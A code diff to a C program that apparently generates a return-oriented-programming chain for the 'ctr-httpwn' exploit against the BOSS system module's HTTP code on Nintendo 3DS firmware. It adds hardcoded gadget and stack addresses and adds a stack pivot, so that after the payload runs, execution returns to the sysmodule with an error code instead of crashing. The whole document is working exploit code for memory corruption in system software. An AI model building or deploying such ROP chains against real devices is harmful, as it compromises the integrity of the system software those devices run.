@@ -66,6 +66,9 @@ u32 ROP_get_tls = 0x00127a24;//r0 = tls+0 then bx-lr.
 u32 BOSS_psps_sessionhandle = 0x0014b204;
 u32 BOSS_fsuser_sessionhandle = 0x0014b198+16;
 
+u32 BOSS_httptargetfunc_ropretaddr = 0x0010c11f;
+u32 BOSS_httptargetfunc_useragent_stackaddr = 0x0803b7f8-0xa4;
+
 u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.
 
 u32 ropvaddr_end = 0;
@@ -323,6 +326,8 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	u32 params[7];
 	u32 datastorage[(0x28+0xc+0x4+0x40)>>2];//The +0x40 is needed to avoid corruption on stack.
 
+	u32 tmp;
+
 	//Embed the URL in the ropchain data.
 	memset(datastorage, 0, sizeof(datastorage));
 	strncpy((char*)datastorage, "http://localhost/ctr-httpwn/cmdhandler", sizeof(datastorage)-1);
@@ -367,7 +372,11 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	params[0] = httpctx;//r0 = _this
 	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CloseContext, params);*/
 
-	ropgen_addword(&ropchain, ropvaddr, 0x30303030);
+	//Return to the actual sysmodule code, with r0 set to ~0 for an error.
+	tmp = BOSS_httptargetfunc_useragent_stackaddr + 0xa0;
+	ropgen_writeu32(&ropchain, ropvaddr, BOSS_httptargetfunc_ropretaddr, tmp, 1);
+	ropgen_setr0(&ropchain, ropvaddr, ~0);
+	ropgen_stackpivot(&ropchain, ropvaddr, tmp);
 }
 
 int main(int argc, char **argv)
@@ -483,7 +492,7 @@ int main(int argc, char **argv)
 
 	if(output_type==0)
 	{
-		ropvaddr_start = 0x0803b7f8-0xa4;
+		ropvaddr_start = BOSS_httptargetfunc_useragent_stackaddr;
 		ropvaddr = ropvaddr_start;
 		ropvaddr_end = ropvaddr+ropchain_maxsize;
 		buildrop_config(ropchain, &ropvaddr, ropchain_maxsize);
